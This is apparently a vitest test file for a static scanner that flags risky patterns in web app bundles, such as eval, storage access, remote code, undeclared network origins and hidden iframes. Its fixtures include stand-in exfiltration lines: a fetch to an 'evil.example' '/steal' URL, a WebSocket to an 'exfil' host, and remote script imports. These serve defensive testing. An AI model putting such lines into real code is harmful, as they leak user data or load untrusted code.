import { describe, expect, it } from 'vitest';
import {
  MAX_BUNDLE_BYTES,
  checkBundleSize,
  declaredOrigins,
  scanBundle,
  type Finding,
  type ScanBundleResult,
} from '../src/scanner.js';
import { makeManifest } from './fixtures.js';

const DEFAULT_HTML = `<!doctype html>
<html><head><meta charset="utf-8"><title>Fixture</title></head>
<body><div id="app"></div>
<script type="module" src="./src/main.js"></script>
</body></html>
`;

interface FixtureOptions {
  mainJs?: string;
  indexHtml?: string;
  manifest?: Record<string, unknown>;
  extraFiles?: Record<string, string | Uint8Array>;
  gzSizeBytes?: number;
}

function scan(opts: FixtureOptions): ScanBundleResult {
  const manifest = makeManifest({ permissions: [], ...(opts.manifest ?? {}) });
  const files: Record<string, string | Uint8Array> = {
    'index.html': opts.indexHtml ?? DEFAULT_HTML,
    'src/main.js': opts.mainJs ?? 'console.log("fixture ready");\n',
    ...(opts.extraFiles ?? {}),
  };
  return scanBundle({ files, manifest, gzSizeBytes: opts.gzSizeBytes });
}

function codes(findings: Finding[]): string[] {
  return findings.map((f) => f.code);
}

describe('static scanner error fixtures', () => {
  it('flags eval()', () => {
    const result = scan({ mainJs: 'const r = eval("2 + 2"); console.log(r);\n' });
    expect(codes(result.errors)).toContain('E_EVAL');
    expect(result.ok).toBe(false);
  });

  it('flags new Function', () => {
    const result = scan({ mainJs: 'const f = new Function("return 1"); console.log(f());\n' });
    expect(codes(result.errors)).toContain('E_EVAL');
  });

  it('flags string-argument setTimeout', () => {
    const result = scan({ mainJs: 'setTimeout("tick()", 1000);\n' });
    expect(codes(result.errors)).toContain('E_EVAL');
  });

  it('flags localStorage and friends (opaque origin)', () => {
    const result = scan({
      mainJs: 'console.log(localStorage.getItem("x"), sessionStorage.length, indexedDB, document.cookie);\n',
    });
    expect(codes(result.errors).filter((c) => c === 'E_OPAQUE_STORAGE').length).toBeGreaterThanOrEqual(4);
  });

  it('flags the Cache API probe', () => {
    const result = scan({ mainJs: 'caches.open("v1").then((c) => console.log(c));\n' });
    expect(codes(result.errors)).toContain('E_OPAQUE_STORAGE');
  });

  it('flags remote <script src> and remote dynamic import', () => {
    const result = scan({
      indexHtml: `<!doctype html>
<html><head><title>f</title></head><body>
<script src="https://cdn.evil.example/lib.js"></script>
<script>import("https://cdn.evil.example/mod.js");</script>
<script type="module" src="./src/main.js"></script>
</body></html>
`,
    });
    expect(codes(result.errors).filter((c) => c === 'E_REMOTE_CODE').length).toBeGreaterThanOrEqual(2);
  });

  it('flags navigator.serviceWorker', () => {
    const result = scan({ mainJs: 'navigator.serviceWorker.register("/sw.js");\n' });
    expect(codes(result.errors)).toContain('E_SERVICE_WORKER');
  });

  it('flags network URLs whose origin is not in manifest.endpoints', () => {
    const result = scan({
      mainJs: 'fetch("https://api.evil.example/steal").then(() => {});\n',
    });
    expect(codes(result.errors)).toContain('E_UNDECLARED_URL');
  });

  it('accepts network URLs whose origin IS declared in manifest.endpoints', () => {
    const result = scan({
      mainJs: 'fetch("https://api.good.example/sync").then(() => {});\n',
      manifest: {
        endpoints: [
          {
            origin: 'https://api.good.example',
            purpose: 'sync app preferences',
            dataSent: ['preferences'],
            dataReceived: ['preferences'],
          },
        ],
      },
    });
    expect(result.errors).toEqual([]);
    expect(result.ok).toBe(true);
  });

  it('accepts wss URLs whose host matches a declared https endpoint, flags undeclared ones', () => {
    // Documented deviation from the SPEC table letter: wss is normalized to
    // https before the allowlist check (CSP/Fetch scheme normalization).
    const endpoints = [
      {
        origin: 'https://api.good.example',
        purpose: 'live sync',
        dataSent: ['preferences'],
        dataReceived: ['preferences'],
      },
    ];
    const okResult = scan({
      mainJs: 'new WebSocket("wss://api.good.example/socket");\n',
      manifest: { endpoints },
    });
    expect(okResult.errors).toEqual([]);
    const badResult = scan({
      mainJs: 'new WebSocket("wss://exfil.evil.example/socket");\n',
      manifest: { endpoints },
    });
    expect(codes(badResult.errors)).toContain('E_UNDECLARED_URL');
  });

  it('flags hidden iframes (display:none, zero-size, srcdoc)', () => {
    const result = scan({
      indexHtml: `<!doctype html>
<html><head><title>f</title></head><body>
<iframe style="display:none" src="./inner.html"></iframe>
<iframe width="0" height="0" src="./inner.html"></iframe>
<iframe srcdoc="&lt;p&gt;hi&lt;/p&gt;"></iframe>
<script type="module" src="./src/main.js"></script>
</body></html>
`,
      extraFiles: { 'inner.html': '<!doctype html><title>x</title>' },
    });
    expect(codes(result.errors).filter((c) => c === 'E_HIDDEN_IFRAME').length).toBe(3);
  });

  it('flags a compressed bundle over 5 MB via gzSizeBytes', () => {
    const result = scan({ gzSizeBytes: 6 * 1024 * 1024 });
    expect(codes(result.errors)).toContain('E_BUNDLE_SIZE');
    expect(result.ok).toBe(false);
  });

  it('does not flag a compressed bundle at or under the cap', () => {
    const result = scan({ gzSizeBytes: MAX_BUNDLE_BYTES });
    expect(codes(result.errors)).not.toContain('E_BUNDLE_SIZE');
  });

  it('does not run the size check when gzSizeBytes is omitted', () => {
    const result = scan({});
    expect(codes(result.errors)).not.toContain('E_BUNDLE_SIZE');
  });

  it('flags a manifest entry missing from the bundle', () => {
    const result = scan({ manifest: { entry: 'app.html' } });
    expect(codes(result.errors)).toContain('E_ENTRY_MISSING');
  });
});

describe('static scanner warning fixtures', () => {
  it('warns on high-entropy string literals', () => {
    const token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    const result = scan({ mainJs: `console.log("${token}");\n` });
    expect(codes(result.warnings)).toContain('W_HIGH_ENTROPY');
  });

  it('warns on hex-encoded keys (below the general entropy threshold)', () => {
    // 64-char hex private key: Shannon entropy ~4.0, under the 4.5 general
    // threshold — caught by the pure-hex heuristic instead.
    const key = 'ddc02e7e7e35695ce9b30d8a87103b75c29c32faf8b0f275996c019f17898e89';
    const result = scan({ mainJs: `const k = "${key}"; console.log(k);\n` });
    expect(codes(result.warnings)).toContain('W_HIGH_ENTROPY');
  });

  it('warns on tight setInterval loops (< 250 ms)', () => {
    const result = scan({ mainJs: 'setInterval(() => { console.log("t"); }, 16);\n' });
    expect(codes(result.warnings)).toContain('W_TIGHT_LOOP');
  });

  it('warns on requestAnimationFrame loops', () => {
    const result = scan({
      mainJs: 'function step() { requestAnimationFrame(step); } requestAnimationFrame(step);\n',
    });
    expect(codes(result.warnings)).toContain('W_TIGHT_LOOP');
  });

  it('warns on a single-call-site self-rescheduling rAF loop', () => {
    const result = scan({
      mainJs: 'const tick = () => { console.log("f"); requestAnimationFrame(tick); };\ntick();\n',
    });
    expect(codes(result.warnings)).toContain('W_TIGHT_LOOP');
  });

  it('does not warn on a one-shot requestAnimationFrame', () => {
    const result = scan({
      mainJs: 'requestAnimationFrame(() => { console.log(document.title); });\n',
    });
    expect(codes(result.warnings)).not.toContain('W_TIGHT_LOOP');
  });

  it('does not warn when rAF passes a non-rescheduling function', () => {
    const result = scan({
      mainJs: 'function measure() { console.log(1); }\nrequestAnimationFrame(measure);\n',
    });
    expect(codes(result.warnings)).not.toContain('W_TIGHT_LOOP');
  });

  it('warns on window.top / window.parent access', () => {
    const result = scan({ mainJs: 'console.log(window.top === window.parent);\n' });
    expect(codes(result.warnings)).toContain('W_FRAME_ESCAPE');
  });

  it('warns on large inline base64 blobs (> 100 KB)', () => {
    const blob = 'QUJD'.repeat(30_000); // 120 000 chars of base64
    const result = scan({ mainJs: `const b = "${blob}"; console.log(b.length);\n` });
    expect(codes(result.warnings)).toContain('W_BASE64_BLOB');
  });

  it('warnings alone leave ok true', () => {
    const result = scan({ mainJs: 'console.log(window.top);\n' });
    expect(result.errors).toEqual([]);
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.ok).toBe(true);
  });
});

describe('clean fixture', () => {
  it('produces zero findings', () => {
    const result = scan({
      mainJs: 'document.querySelector("#app").textContent = "All quiet on the element front.";\n',
    });
    expect(result.errors).toEqual([]);
    expect(result.warnings).toEqual([]);
    expect(result.ok).toBe(true);
  });
});

describe('environment-agnostic contract', () => {
  it('decodes Uint8Array file contents as UTF-8', () => {
    const bytes = new TextEncoder().encode('const r = eval("2 + 2"); console.log(r);\n');
    const result = scan({ extraFiles: { 'src/extra.js': bytes } });
    const finding = result.errors.find((f) => f.code === 'E_EVAL');
    expect(finding).toBeDefined();
    expect(finding?.file).toBe('src/extra.js');
  });

  it('reports findings with bundle-relative file paths and 1-based lines', () => {
    const result = scan({ mainJs: '// line one\nconst r = eval("2 + 2");\nconsole.log(r);\n' });
    const finding = result.errors.find((f) => f.code === 'E_EVAL');
    expect(finding?.file).toBe('src/main.js');
    expect(finding?.line).toBe(2);
  });

  it('only scans js/mjs/cjs and html files', () => {
    const result = scan({
      extraFiles: {
        'notes.txt': 'eval("not code, not scanned")',
        'data.json': '{"cmd":"eval(1)"}',
        'src/worker.mjs': 'const r = eval("1"); console.log(r);\n',
      },
    });
    const evalFiles = result.errors.filter((f) => f.code === 'E_EVAL').map((f) => f.file);
    expect(evalFiles).toEqual(['src/worker.mjs']);
  });

  it('checkBundleSize returns null at the cap and a finding above it', () => {
    expect(checkBundleSize(MAX_BUNDLE_BYTES)).toBeNull();
    expect(checkBundleSize(MAX_BUNDLE_BYTES + 1)?.code).toBe('E_BUNDLE_SIZE');
  });

  it('declaredOrigins extracts endpoint origins defensively', () => {
    expect(
      declaredOrigins({
        endpoints: [{ origin: 'https://api.good.example' }, { origin: 42 }, null, 'junk'],
      }),
    ).toEqual(new Set(['https://api.good.example']));
    expect(declaredOrigins({})).toEqual(new Set());
    expect(declaredOrigins({ endpoints: 'nope' })).toEqual(new Set());
  });
});
